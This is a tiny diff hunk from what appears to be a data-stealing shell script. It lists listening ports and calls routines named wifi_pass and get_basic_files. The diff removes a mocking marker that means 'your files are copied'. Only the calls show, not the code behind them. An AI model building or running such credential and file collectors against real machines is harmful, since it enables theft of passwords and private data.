@@ -44,7 +44,5 @@ EOF
   netstat -aon | grep "LISTENING" > "$SYSTEMINF"\\.netstat_listen
   wifi_pass
   get_basic_files
-  #Leave trace for fun
-  export SPIDER="ur_f1les_4r3_c0p13d";
 }
 main
